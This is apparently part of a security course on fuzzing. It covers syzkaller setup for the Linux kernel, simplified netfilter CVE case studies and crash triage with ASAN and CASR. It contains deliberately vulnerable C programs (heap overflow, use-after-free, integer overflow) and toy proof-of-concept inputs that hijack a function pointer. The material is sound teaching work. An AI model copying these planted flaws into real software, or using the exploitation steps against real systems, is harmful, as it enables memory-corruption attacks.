# Extended reference (split from SKILL.md for context economy)

## Day 5: Introduction to `Syzkaller`

- **Goal**: Begin kernel fuzzing with `Syzkaller`.
- **Activities**:
  - _Tool_: Install `Syzkaller` on a Linux VM.
  - _Online Resource_: [`Syzkaller` Documentation](https://github.com/google/syzkaller/blob/master/docs/linux/setup_ubuntu-host_qemu-vm_x86-64-kernel.md)
  - _Real-World Impact_:
    - [Syzkaller Dashboard](https://syzkaller.appspot.com/) - Shows thousands of bugs found by syzkaller
    - [syzkaller: Finding Bugs in the Linux Kernel](https://lwn.net/Articles/677764/) - Overview of syzkaller's impact
    - Many CVEs discovered: Check [syzkaller bug reports](https://syzkaller.appspot.com/upstream) for real examples
  - _Exercise_: Start fuzzing the Linux kernel with `Syzkaller`.

```bash
# Install kernel build dependencies
sudo apt update
sudo apt install -y make gcc flex bison libncurses-dev libelf-dev libssl-dev

# Clone Linux kernel (use a recent stable version)
# Check available tags: https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/refs/tags
cd ~/soft && git clone --branch v6.8 --depth 1 git://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git kernel

# Verify kernel version
cd kernel && git describe --tags

# Configure kernel for syzkaller
make defconfig
make kvm_guest.config

# Edit .config to enable syzkaller requirements
# Use sed or manually edit .config
sed -i 's/# CONFIG_KCOV is not set/CONFIG_KCOV=y/' .config
sed -i 's/# CONFIG_DEBUG_INFO_DWARF4 is not set/CONFIG_DEBUG_INFO_DWARF4=y/' .config
sed -i 's/# CONFIG_KASAN is not set/CONFIG_KASAN=y/' .config
sed -i 's/# CONFIG_KASAN_INLINE is not set/CONFIG_KASAN_INLINE=y/' .config
sed -i 's/# CONFIG_CONFIGFS_FS is not set/CONFIG_CONFIGFS_FS=y/' .config
sed -i 's/# CONFIG_SECURITYFS is not set/CONFIG_SECURITYFS=y/' .config
echo 'CONFIG_CMDLINE_BOOL=y' >> .config
echo 'CONFIG_CMDLINE="net.ifnames=0"' >> .config

make olddefconfig
make -j$(nproc)

# Create VM image
sudo apt install -y debootstrap
mkdir -p ~/soft/image && cd ~/soft/image
wget https://raw.githubusercontent.com/google/syzkaller/master/tools/create-image.sh -O create-image.sh
chmod +x create-image.sh
./create-image.sh --distribution trixie --feature full

# Install QEMU
sudo apt install -y qemu-system-x86

# Test VM boot (optional - verify image works)
# NOTE: You might need to run this outside of the vm, you might need to change net to e1000
cd /tmp/
sudo qemu-system-x86_64 \
    -m 2G -smp 2 \
    -kernel ~/soft/kernel/arch/x86/boot/bzImage \
    -append "console=ttyS0 root=/dev/sda earlyprintk=serial net.ifnames=0" \
    -drive file=~/soft/image/trixie.img,format=raw \
    -net user,hostfwd=tcp:127.0.0.1:10021-:22 \
    -net nic,model=virtio -enable-kvm -nographic \
    -pidfile vm.pid 2>&1 | tee vm.log

# In another terminal, test SSH access
ssh -i ~/soft/image/trixie.id_rsa -p 10021 -o "StrictHostKeyChecking no" root@localhost

# Install Go
cd ~/soft
GO_VERSION="1.25.4"
wget "https://go.dev/dl/go${GO_VERSION}.linux-amd64.tar.gz"
sudo tar -C /usr/local -xzf "go${GO_VERSION}.linux-amd64.tar.gz"
export PATH=$PATH:/usr/local/go/bin

# Add to ~/.bashrc for persistence
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc

# Verify Go installation
go version

# Clone and build syzkaller
cd ~/soft && git clone --branch master --depth 1 https://github.com/google/syzkaller.git
cd syzkaller && make -j$(nproc)

# Create syzkaller configuration
# NOTE: If you are in the vm with e1000 then you don't need network_device line
cat > my.cfg << 'EOT'
{
    "target": "linux/amd64",
    "http": "127.0.0.1:56741",
    "workdir": "/home/USER/soft/syzkaller/workdir",
    "kernel_src": "/home/USER/soft/kernel",
    "image": "/home/USER/soft/image/trixie.img",
    "sshkey": "/home/USER/soft/image/trixie.id_rsa",
    "ssh_user": "root",
    "syzkaller": "/home/USER/soft/syzkaller",
    "procs": 8,
    "type": "qemu",
    "vm": {
        "count": 3,
        "kernel": "/home/USER/soft/kernel/arch/x86/boot/bzImage",
        "cmdline": "net.ifnames=0",
        "cpu": 2,
        "mem": 2048,
        "network_device": "virtio-net-pci"
    }
}
EOT

# Replace $USER with actual username
sed -i "s/USER/$USER/g" my.cfg

# Create workdir and start syzkaller
mkdir -p workdir
# NOTE: this might take a while, run with -debug to to identify issues
sudo ./bin/syz-manager -config=my.cfg

# Access web interface
# Install text-based browser or use your regular browser
sudo apt install -y w3m w3m-img
w3m http://127.0.0.1:56741

# Or open in regular browser: http://127.0.0.1:56741
```

**Success Criteria**:

- Kernel compiles successfully with KASAN and KCOV enabled
- VM image creates without errors
- VM boots and is accessible via SSH
- Syzkaller manager starts and shows web interface
- Web interface displays fuzzing statistics

**Expected Outputs**:

- Web interface showing: exec total, crashes, coverage, etc.
- Crashes appearing in `workdir/crashes/` directory
- Kernel oops messages in VM logs

**Troubleshooting**:

- If kernel doesn't boot: Check QEMU/KVM is enabled (`lsmod | grep kvm`)
- If syzkaller can't connect: Verify SSH key permissions (`chmod 600 trixie.id_rsa`)
- If no crashes: Let run longer - kernel fuzzing takes time
- Memory issues: Reduce VM count in config if system runs out of RAM

### Real-World Impact: Syzkaller's Contribution to Kernel Security

**Case Study - CVE-2022-32250 (Linux Netfilter Use-After-Free)**:

From Week 1, you learned about this vulnerability. Here's how syzkaller discovered it:

- **Target**: `net/netfilter/nf_tables_api.c` - Linux firewall subsystem
- **Discovery Date**: May 2022
- **Fuzzing Duration**: ~72 hours from code introduction to crash
- **Root Cause**: Reference counting error in stateful expression handling

**The Discovery Process**:

```bash
# Syzkaller's approach (simplified)
# 1. System call description for netfilter operations
{
    "nfnetlink_create": {
        "protocol": "NETLINK_NETFILTER",
        "operations": ["NFT_MSG_NEWTABLE", "NFT_MSG_NEWCHAIN", "NFT_MSG_NEWRULE"]
    }
}

# 2. Syscall sequence that triggered the bug
socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER)
sendmsg(fd, {
    type: NFT_MSG_NEWTABLE,
    flags: NLM_F_CREATE | NLM_F_EXCL,
    data: [table_attrs]
})
sendmsg(fd, {
    type: NFT_MSG_NEWCHAIN,
    data: [chain_with_stateful_expr]
})
# Trigger: Modify stateful expression in specific sequence
sendmsg(fd, {
    type: NFT_MSG_NEWRULE,
    data: [rule_update_that_frees_expr]
})
# Use freed expression -> UAF crash

# 3. KASAN detected use-after-free
# BUG: KASAN: use-after-free in nf_tables_expr_destroy+0x12/0x20
# Read of size 8 at addr ffff888012345678 by task syz-executor/1234
```

**Why Syzkaller Found It**:

1. **Syscall coverage**: Tests all netfilter operations systematically
2. **Sequence exploration**: Tries millions of syscall orderings
3. **State tracking**: Maintains kernel state across operations
4. **KASAN integration**: Immediate detection of memory corruption
5. **Reproducibility**: Generates C reproducer for developers

**The Reproducer** (simplified):

```c
// Generated by syzkaller - minimal reproducer
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/netfilter/nf_tables.h>

int main(void) {
    int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);

    // Create table
    send_nft_msg(fd, NFT_MSG_NEWTABLE, ...);

    // Create chain with stateful expression
    send_nft_msg(fd, NFT_MSG_NEWCHAIN, ...);

    // Trigger UAF through rule update
    send_nft_msg(fd, NFT_MSG_NEWRULE, ...);

    return 0;
}
```

**Impact**: Local privilege escalation from any user to root on systems with unprivileged user namespaces (default on Ubuntu, Debian). Public exploit available within weeks.

**Case Study - CVE-2023-32629 (Linux Netfilter Race Condition)**:

- **Target**: `net/netfilter/nf_tables_api.c` - Same subsystem, different bug
- **Bug Class**: Race condition in batch transaction handling
- **Discovery**: Syzkaller's multi-threaded syscall fuzzing
- **Impact**: Container escape + privilege escalation

**How Syzkaller Finds Race Conditions**:

```bash
# Syzkaller executes syscalls in parallel across multiple threads
# VM 1, Thread 1:
socket(AF_NETLINK, ...) → fd1
sendmsg(fd1, NFT_MSG_NEWTABLE, ...)

# VM 1, Thread 2 (simultaneous):
socket(AF_NETLINK, ...) → fd2
sendmsg(fd2, NFT_MSG_NEWTABLE, ...)  # Race on same table

# Result: Concurrent access to nf_tables objects without proper locking
# KASAN detects: use-after-free or memory corruption
```

**Syzkaller's Advantages for Kernel Fuzzing**:

1. **Syscall descriptions**: Domain-specific language for kernel APIs
2. **Coverage-guided**: Tracks code coverage to explore new paths
3. **Multi-threaded**: Finds race conditions naturally
4. **VM-based isolation**: Kernel crashes don't affect fuzzer
5. **Reproducers**: Automatic generation of minimal C reproducers
6. **Bisection**: Automatically finds introducing commit

**Analyzing a Syzkaller Bug**:

```bash
# Download reproducer from dashboard
mkdir -p ~/tuts/syz-repro && cd ~/tuts/syz-repro
wget "https://syzkaller.appspot.com/text?tag=ReproC&x=15ad9542580000" -O repro.c

# Compile and test on vulnerable kernel
gcc -pthread -o repro repro.c
./repro

# Expected: Segmentation Fault
# Kernel log shows UBSAN: array-index-out-of-bounds

# Analyze how it got identified:
https://syzkaller.appspot.com/bug?extid=77026564530dbc29b854
```

**Key Insight**: Kernel attack surface is massive. Syzkaller's systematic approach finds bugs that would take years of manual testing.

### Key Takeaways

1. **Syzkaller revolutionized kernel security**: Found 4,500+ bugs that manual testing missed
2. **Syscall fuzzing requires domain knowledge**: Must understand kernel APIs to fuzz effectively
3. **Race conditions need parallel execution**: Multi-threaded fuzzing essential
4. **VM isolation is critical**: Kernel crashes would kill the fuzzer otherwise
5. **Reproducers enable fixing**: Minimal C programs allow developers to debug quickly

### Discussion Questions

1. Why has syzkaller found thousands of kernel bugs that years of production use didn't reveal?
2. How does syzkaller's syscall description language enable effective kernel fuzzing?
3. What makes race condition detection particularly valuable in kernel fuzzing?
4. Why are networking subsystems (netfilter, inet) the most frequent sources of vulnerabilities?
5. How do user namespaces make kernel vulnerabilities more dangerous by increasing exploitability?

## Day 6: Crash Analysis and Exploitability Assessment

- **Goal**: Understand crash triage, root cause analysis, and exploitability assessment for fuzzer-discovered bugs.
- **Activities**:
  - _Reading_:
    - "Fuzzing for Software Security Testing and Quality Assurance" by Ari Takanen (Sections 6.1 to 6.6.6)
    - "The Art of Software Security Assessment" Chapter 5 and 6
  - _Online Resources_:
    - [AddressSanitizer Documentation](https://clang.llvm.org/docs/AddressSanitizer.html)
    - [CASR - Crash Analysis and Severity Report](https://github.com/ispras/casr/blob/master/docs/usage.md)
    - [OSS-Fuzz Guide](https://google.github.io/oss-fuzz/advanced-topics/reproducing/)
  - _Real-World Context_:
    - [Exploitability Ratings](https://www.cisa.gov/known-exploited-vulnerabilities)
    - [Crash Accumulation During Fuzzing with CASR](https://sydr-fuzz.github.io/papers/crash-accumulation.pdf)
    - [Effective Fuzzing Harness](https://srlabs.de/blog/unlocking-secrets-effective-fuzzing-harness)
  - _Concepts_:
    - Crash deduplication and bucketing
    - Root cause analysis from stack traces
    - Exploitability classification
    - ASAN report interpretation
    - Building proof-of-concept exploits

### Understanding Crash Analysis Tools

```bash
# Install crash analysis toolkit
sudo apt update
sudo apt install -y gdb python3-pip valgrind binutils

# Install GEF (GDB Enhanced Features) - if you haven't done so already
#wget -O ~/.gdbinit-gef.py -q https://gef.blah.cat/py
#echo "source ~/.gdbinit-gef.py" >> ~/.gdbinit

# Install CASR (Crash Analysis and Severity Report) and rust if you haven't already
#curl --proto '=https' --tlsv1.2 -sSf "https://sh.rustup.rs" | sh
#source ~/.cargo/env
cargo install casr

# Verify installations
casr-san --help | head -5
```

### Case Study 1: Analyzing Heap Buffer Overflow

**Scenario**: Fuzzing discovered a crash in an image parser. Let's perform complete analysis.

```bash
# Create sample vulnerable image parser
mkdir -p ~/crash_analysis/case1_heap_overflow && cd ~/crash_analysis/case1_heap_overflow

cat > vuln_parser.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

void build_huffman_table(uint8_t *input, size_t size) {
    if (size < 8) return;

    uint32_t table_size = *(uint32_t*)input;
    uint8_t *codes = input + 4;

    uint8_t *table = malloc(256);

    // VULNERABILITY: No bounds check on table_size
    // Can write beyond 256-byte buffer
    memcpy(table, codes, table_size);  // Heap buffer overflow!

    printf("Built Huffman table with %u codes\n", table_size);

    free(table);
}

int main(int argc, char **argv) {
    if (argc < 2) return 1;

    FILE *f = fopen(argv[1], "rb");
    if (!f) return 1;

    fseek(f, 0, SEEK_END);
    size_t size = ftell(f);
    fseek(f, 0, SEEK_SET);

    uint8_t *data = malloc(size);
    fread(data, 1, size, f);
    fclose(f);

    build_huffman_table(data, size);

    free(data);
    return 0;
}
EOF

# Compile with ASAN for detailed crash reports
clang-19 -g -O0 -fsanitize=address -o vuln_parser_asan vuln_parser.c

# Create crashing input (table_size = 512, overflows 256-byte buffer)
python3 << 'EOF'
import struct
# table_size = 512 (causes 256-byte overflow)
payload = struct.pack('<I', 512)
payload += b'A' * 512
with open('crash_heap_overflow.bin', 'wb') as f:
    f.write(payload)
EOF

# Run and capture ASAN output
./vuln_parser_asan crash_heap_overflow.bin 2>&1 | tee asan_crash.log
```

**ASAN Output Analysis**:

```
==37160==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x511000000140 at pc 0x56d6a37d0f62 bp 0x7ffd9f024440 sp 0x7ffd9f023c00
WRITE of size 512 at 0x511000000140 thread T0
    #0 0x56d6a37d0f61 in __asan_memcpy
    #1 0x56d6a38147f5 in build_huffman_table vuln_parser.c:16:5
    #2 0x56d6a38148fe in main vuln_parser.c:37:5

0x511000000140 is located 0 bytes after 256-byte region [0x511000000040,0x511000000140)
allocated by thread T0 here:
    #0 0x56d6a37d3193 in malloc (vuln_parser_asan+0xcc193) (BuildId: e524ec295f274ddf6e407b3941080060bdfc9d1c)
    #1 0x56d6a38147df in build_huffman_table vuln_parser.c:12:22
    #2 0x56d6a38148fe in main vuln_parser.c:37:5

SUMMARY: AddressSanitizer: heap-buffer-overflow (vuln_parser_asan+0xc9f61) (BuildId: e524ec295f274ddf6e407b3941080060bdfc9d1c) in __asan_memcpy
Shadow bytes around the buggy address:
  0x510ffffffe80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x510fffffff00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x510fffffff80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x511000000000: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00
  0x511000000080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x511000000100: 00 00 00 00 00 00 00 00[fa]fa fa fa fa fa fa fa
```

**Interpreting the ASAN Report**:

1. **Bug Type**: `heap-buffer-overflow`
2. **Operation**: WRITE of size 512
3. **Location**: `vuln_parser.c:16` in `build_huffman_table()`
4. **Allocation**: 256-byte buffer at line 12
5. **Overflow**: Writing 512 bytes into 256-byte buffer = 256 bytes overflow

**Root Cause Analysis**:

```bash
# View the vulnerable code with context
cat -n vuln_parser.c | sed -n '6,16p'
#     6  void build_huffman_table(uint8_t *input, size_t size) {
#     7      if (size < 8) return;
#     8
#     9      uint32_t table_size = *(uint32_t*)input;  // ATTACKER CONTROLLED
#    10      uint8_t *codes = input + 4;
#    11
#    12      uint8_t *table = malloc(256);             // Fixed 256 bytes
#    13
#    14      // VULNERABILITY: No bounds check on table_size
#    15      // Can write beyond 256-byte buffer
#    16      memcpy(table, codes, table_size);         // Copies attacker-controlled amount!
```

**Exploitability Assessment**:

```bash
# Classify crash automatically with CASR (using the ASAN run you captured above)
#casr-san -o heap_overflow.casrep -- ./vuln_parser_asan crash_heap_overflow.bin 2>&1 | tee casr_heap_overflow.log
casr-san --stdout -- ./vuln_parser_asan crash_heap_overflow.bin | tee heap_overflow.casrep

# The .casrep and log will contain fields like:
#   "Type": "EXPLOITABLE",
#   "ShortDescription": "heap-buffer-overflow(write)",

# You can still use GDB for manual inspection of the corrupted heap if you want:
gdb ./vuln_parser_asan
(gdb) run crash_heap_overflow.bin
```

**Exploitability Classification**: **EXPLOITABLE**

**Reasoning**:

1. **Attacker controls overflow size**: `table_size` from input
2. **Attacker controls overflow data**: `codes` array content
3. **Heap corruption possible**: Can overwrite adjacent objects
4. **Exploitation path**:
   - Overflow into adjacent heap object
   - Corrupt function pointer or vtable
   - Hijack control flow
   - Execute arbitrary code

**Real-World Example**: Similar to CVE-2023-4863 (libWebP Heap Buffer Overflow) from Week 1.

### Case Study 2: Use-After-Free Analysis

```bash
mkdir -p ~/crash_analysis/case2_uaf && cd ~/crash_analysis/case2_uaf

cat > vuln_uaf.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
    char *name;
    void (*process)(void);
} Handler;

void default_handler(void) {
    printf("Default handler\n");
}

void evil_handler(void) {
    printf("Evil handler executed! Code execution via UAF.\n");
}

Handler *handler = NULL;

void register_handler(char *name) {
    handler = malloc(sizeof(Handler));
    handler->name = strdup(name);
    handler->process = default_handler;
}

void unregister_handler(void) {
    if (handler) {
        free(handler->name);
        free(handler);
        // BUG: Should set handler = NULL here!
    }
}

void attacker_groom_heap(void) {
    for (int i = 0; i < 1000; i++) {
        Handler *fake = malloc(sizeof(Handler));
        fake->name = "pwned";
        fake->process = evil_handler;
    }
}

void call_handler(void) {
    if (handler) {
        handler->process();
    }
}

int main(int argc, char **argv) {
    register_handler("test");
    unregister_handler();
    attacker_groom_heap();
    call_handler();

    return 0;
}
EOF

# Compile with ASAN
clang-19 -g -O0 -fsanitize=address -o vuln_uaf_asan vuln_uaf.c

# Run and capture output
./vuln_uaf_asan 2>&1 | tee uaf_crash.log
```

**ASAN Output**:

```
=================================================================
==38664==ERROR: AddressSanitizer: heap-use-after-free on address 0x502000000010 at pc 0x617b2245a953 bp 0x7ffe92f7c160 sp 0x7ffe92f7c158
READ of size 8 at 0x502000000010 thread T0
    #0 0x617b2245a952 in call_handler vuln_uaf.c:44:50
    #1 0x617b2245a9d0 in main vuln_uaf.c:53:5

0x502000000010 is located 0 bytes inside of 16-byte region [0x502000000010,0x502000000020)
freed by thread T0 here:
    #1 0x617b2245a86a in unregister_handler vuln_uaf.c:29:9
    #2 0x617b2245a9c6 in main vuln_uaf.c:51:5

previously allocated by thread T0 here:
    #1 0x617b2245a7a5 in register_handler vuln_uaf.c:21:15
    #2 0x617b2245a9c1 in main vuln_uaf.c:50:5

SUMMARY: AddressSanitizer: heap-use-after-free vuln_uaf.c:44:50 in call_handler
Shadow bytes around the buggy address:
  0x501ffffffd80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x501ffffffe00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x501ffffffe80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x501fffffff00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x501fffffff80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x502000000000: fa fa[fd]fd fa fa fd fa fa fa 00 00 fa fa 00 00
```

**Exploitability Assessment**:

```bash
# Classify crash with CASR again (now for a UAF instead of overflow)
casr-san --stdout -- ./vuln_uaf_asan 2>&1 | tee uaf.casrep

# The report will highlight:
#   - Bug class: heap-use-after-free
#   - Severity: "NOT_EXPLOITABLE"
#   - Reason: ASan instruments the READ of the function pointer *before* the call.
#     Since it's a read from freed memory, CASR defaults to "Not Exploitable".
#
#     This is a critical lesson: Automated tools are heuristics.
#     A human analyst sees "Read of function pointer from freed memory" -> Critical.

# To prove exploitability, we would need to:
# 1. Bypass ASan quarantine (so memory is reallocated/valid)
# 2. Overwrite with a bad pointer
# 3. Trigger the crash on the JUMP (SEGV), not the UAF read.
#
# For now, trust your manual analysis: Controlling a function pointer is exploitable.

# For deeper debugging, verify the exploit manually in GDB:
# NOTE: You must disable ASan quarantine to allow the freed chunk to be reused!
# Otherwise, malloc() will return a new address, and handler->process will still be old/garbage.
export ASAN_OPTIONS=detect_leaks=0:quarantine_size_mb=0

gdb ./vuln_uaf_asan
(gdb) break vuln_uaf.c:44   # Break at call_handler (before crash)
(gdb) run
(gdb) p handler
# $1 = (Handler *) 0x...

(gdb) p *handler
# With quarantine=0, you should see:
# name = "pwned"
# process = <evil_handler>

(gdb) p handler->process
# Should point to evil_handler

(gdb) continue
# Execution should flow to evil_handler() (or crash if ASan still catches the shadow marker)

```

**Exploitability Classification**: **EXPLOITABLE** (Verified via manual analysis)

> [!NOTE]: Automated tools like CASR may label this `NOT_EXPLOITABLE` because ASan instruments the function pointer _read_ before the call. Manual verification (as shown above) proves control flow hijack is possible.

**Exploitation Strategy**:

1. **Heap grooming**: Allocate/free to position objects
2. **Reclaim freed memory**: Allocate object of same size (requires bypassing ASan quarantine in lab)
3. **Control freed memory contents**: Fill with attacker data
4. **Trigger UAF**: Call `call_handler()`
5. **Function pointer hijack**: `handler->process` points to attacker-controlled address
6. **Result**: Arbitrary code execution

**Real-World Example**: Similar to CVE-2024-2883 (Chrome ANGLE UAF) from Week 1.

### Case Study 3: Integer Overflow Leading to Heap Corruption

```bash
mkdir -p ~/crash_analysis/case3_integer_overflow && cd ~/crash_analysis/case3_integer_overflow

cat > vuln_intoverflow.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

void process_image(uint32_t width, uint32_t height, uint8_t *data) {
    size_t pixel_count = width * height;
    size_t buffer_size = pixel_count * 4;

    printf("Allocating %zu bytes for %ux%u image\n", buffer_size, width, height);

    uint8_t *buffer = malloc(buffer_size);

    for (size_t i = 0; i < (size_t)width * height; i++) {
        // WRITES out of bounds immediately
        // Use modulo to avoid reading out of bounds of 'data'
        buffer[i * 4] = data[i % 1024];
    }

    free(buffer);
}

int main(int argc, char **argv) {
    // Attacker-controlled dimensions
    uint32_t width = 0x10000;   // 65536
    uint32_t height = 0x10000;  // 65536

    uint8_t fake_data[1024];
    memset(fake_data, 'A', sizeof(fake_data));

    process_image(width, height, fake_data);

    return 0;
}
EOF

# Compile with ASAN and UBSAN
clang-19 -g -O0 -fsanitize=address,unsigned-integer-overflow -o vuln_int_asan vuln_intoverflow.c

# Run
./vuln_int_asan 2>&1 | tee intoverflow_crash.log
```

**Analysis**:

```
vuln_intoverflow.c:7:32: runtime error: unsigned integer overflow: 65536 * 65536 cannot be represented in type 'uint32_t' (aka 'unsigned int')
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior vuln_intoverflow.c:7:32
=================================================================
==39011==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000014 at pc 0x5fa5104bd933 bp 0x7ffd7d3885a0 sp 0x7ffd7d388598
WRITE of size 1 at 0x502000000014 thread T0
    #0 0x5fa5104bd932 in process_image vuln_intoverflow.c:17:23
    #1 0x5fa5104bdad0 in main vuln_intoverflow.c:31:5

0x502000000014 is located 3 bytes after 1-byte region [0x502000000010,0x502000000011)
allocated by thread T0 here:
    #1 0x5fa5104bd7fc in process_image vuln_intoverflow.c:12:23

SUMMARY: AddressSanitizer: heap-buffer-overflow vuln_intoverflow.c:17:23 in process_image
Shadow bytes around the buggy address:
  0x501ffffffd80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x501ffffffe00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x501ffffffe80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x501fffffff00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x501fffffff80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x502000000000: fa fa[01]fa fa fa fa fa fa fa fa fa fa fa fa fa

```

**Root Cause**:

1. **Integer Overflow**: `width * height` overflows 32-bit integer range, wrapping to 0.
2. **Under-allocation**: `malloc(0)` allocates a tiny chunk.
3. **Logic Mismatch**: Loop uses proper 64-bit bounds (or nested loops), iterating 4 billion times.
4. **Heap Corruption**: Loop writes far beyond the allocated chunk.

**Exploitability Assessment**:

```bash
# Classify crash with CASR
# Note: UBSAN might print an error first, but ASAN catches the memory corruption
casr-san --stdout -- ./vuln_int_asan 2>&1 | tee intoverflow.casrep

# The report will highlight:
#    "Type": "EXPLOITABLE",
#    "ShortDescription": "heap-buffer-overflow(write)",
#    "Description": "Heap buffer overflow",

# Verify manually in GDB:
gdb ./vuln_int_asan
(gdb) break vuln_intoverflow.c:17   # Break inside the loop
(gdb) run
(gdb) p buffer_size
# $1 = 0
(gdb) p buffer
# $2 = (uint8_t *) 0x... (Valid small chunk)
(gdb) x/4gx buffer
# Check adjacent memory (likely metadata or other chunks)
(gdb) step
# Watch the write to buffer[0] corrupting the heap
(gdb) continue
```

**Exploitability Classification**: **EXPLOITABLE**

**Exploitation Strategy**:

1. **Heap Grooming**: Allocate a sensitive object (e.g., a structure with a function pointer) immediately after the vulnerable 0-byte allocation.
2. **Trigger Overflow**: Send input with dimensions `0x10000 * 0x10000` to cause integer overflow -> `malloc(0)`.
3. **Overwrite**: The loop writes attacker data (`fake_data`) into the adjacent sensitive object.
4. **Hijack**: Trigger the use of the corrupted object (e.g., call the function pointer).

### Building Proof-of-Concept Exploits

#### Heap Overflow Example

```bash
cd ~/crash_analysis/case1_heap_overflow
cat > buf_ov.py << 'EOF'
#!/usr/bin/env python3
# POC for heap buffer overflow in vuln_parser

import struct

def craft_overflow_input():
    """Create input that causes a massive overflow"""
    # Target allocates 256 bytes. We claim size is 512.
    table_size = 512

    # Structure: [Size (4 bytes)] [Data (512 bytes)]
    payload = struct.pack('<I', table_size)
    payload += b'A' * table_size

    return payload

with open('poc_exploit.bin', 'wb') as f:
    f.write(craft_overflow_input())

print("[+] Created poc_exploit.bin")
print("[+] Run the ASan build for diagnostics or the no-sanitizer build for raw exploitation.")
EOF
python3 buf_ov.py
# Diagnostic run (shows detailed ASan report)
./vuln_parser_asan poc_exploit.bin

# Realistic exploit run (no sanitizers, glibc notices corrupted heap metadata)
clang-19 -g -O0 -o vuln_parser_nosan vuln_parser.c
MALLOC_CHECK_=0 ./vuln_parser_nosan poc_exploit.bin
```

#### Use-After-Free Example

```bash
cd ~/crash_analysis/case2_uaf

# Build a runtime version without sanitizers (ensures freed chunks are reused immediately)
clang-19 -g -O0 -o vuln_uaf_nosan vuln_uaf.c

# Optional: keep the ASan build for triage but disable quarantine to watch exploitation
# ASAN_OPTIONS=quarantine_size_mb=0 ./vuln_uaf_asan

# Execute the no-sanitizer build to watch the hijacked handler fire
./vuln_uaf_nosan
```

Expected console output:

```
Evil handler executed! Code execution via UAF.
```

To force an outright crash (showing instruction-pointer control), change the spray in `attacker_groom_heap()` to:

```c
fake->process = (void (*)(void))0x4141414141414141ULL;
```

Running `./vuln_uaf_nosan` now ends with a segfault at `0x4141414141414141`, demonstrating control-flow hijack without AddressSanitizer interfering.

### Key Takeaways

1. **Sanitized vs non-sanitized builds**: Use ASan/UBSan/KASAN builds for **triage and root-cause**, then switch to **no-sanitizer builds** (with knobs like `ASAN_OPTIONS` or `MALLOC_CHECK_`) to study realistic heap behavior and exploitation.
2. **Automated ratings are heuristics**: CASR’s `Type`/`Severity` fields are a **starting point only**; Case Study 2 showed a UAF rated `NOT_EXPLOITABLE` even though a function pointer hijack is clearly possible.
3. **Crash location vs root cause**: Tools often stop at the **first invalid access** (e.g., a read from freed memory) while the real exploit primitive (e.g., control-flow hijack) may be one instruction later.
4. **Exploitability hinges on control**: In all three case studies, exploitation becomes realistic when the attacker controls **sizes (length, dimensions) and data** that drive allocation and memory writes.
5. **Systematic PoC development**: The path is always _fuzz → crash → triage (ASan + CASR) → root cause → minimal reproducer → exploit PoC (heap metadata or function pointer overwrite)_.

### Discussion Questions

1. In your own workflow, when would you prefer to keep AddressSanitizer enabled, and when would you switch to a no-sanitizer build while evaluating exploitability?
2. How could CASR’s `NOT_EXPLOITABLE` rating for the UAF case mislead a less experienced analyst, and what manual checks (in GDB) prevent that mistake?
3. In the integer-overflow case, which variables and addresses would you inspect in GDB to confirm both under-allocation and the ensuing heap overwrite?
4. How does the exact crash site (e.g., first invalid read vs later jump through a corrupted function pointer) change your assessment of exploitability and which tools notice it?
5. How do modern mitigations (ASLR, DEP, hardened allocators, CFI) interact with the exploitation strategies you used in Case Studies 1–3, and what extra steps would be needed in a real target?

### Further Reading

#### Blog Posts and Case Studies

- [Leveling Up Fuzzing: Finding more vulnerabilities with AI ](https://security.googleblog.com/2024/11/leveling-up-fuzzing-finding-more.html)
- [AFL Success Stories](https://lcamtuf.blogspot.com/2014/11/afl-fuzz-nobody-expects-cdata-sections.html)
- [5 CVEs Found with Feedback-Based Fuzzing](https://www.code-intelligence.com/blog/5-cves-found-with-feedback-based-fuzzing)
- [Syzkaller: Finding Bugs in the Linux Kernel](https://lwn.net/Articles/677764/)
- [OpenSSL Fuzzing Guide](https://www.openssl.org/docs/man3.3/man7/ossl-guide-fuzzing.html)
- [Slice: SAST + LLM Interprocedural Context Extractor](https://noperator.dev/posts/slice/) - Using build-free CodeQL + Tree-Sitter + GPT‑5 to triage ~1700 static UAF candidates in the Linux kernel down to a single real bug (CVE-2025-37778), a good complement to fuzzing-based crash triage.

#### Practice Targets

- [Fuzzing-Module](https://github.com/alex-maleno/Fuzzing-Module) - Learning exercises
- [Damn Vulnerable C Program](https://github.com/hardik05/Damn_Vulnerable_C_Program) - Vulnerable code for practice

## Day 7: Fuzzing Harness Development and Real-World Campaigns

- **Goal**: Learn to write effective fuzzing harnesses and understand real-world fuzzing campaigns.
- **Activities**:
  - _Reading_:
    - [libFuzzer Tutorial](https://github.com/google/fuzzing/blob/master/tutorial/libFuzzerTutorial.md)
    - [OSS-Fuzz Integration Guide](https://google.github.io/oss-fuzz/getting-started/new-project-guide/)
  - _Online Resources_:
    - [Fuzzing Harness Examples](https://github.com/google/fuzzing/tree/master/tutorial)
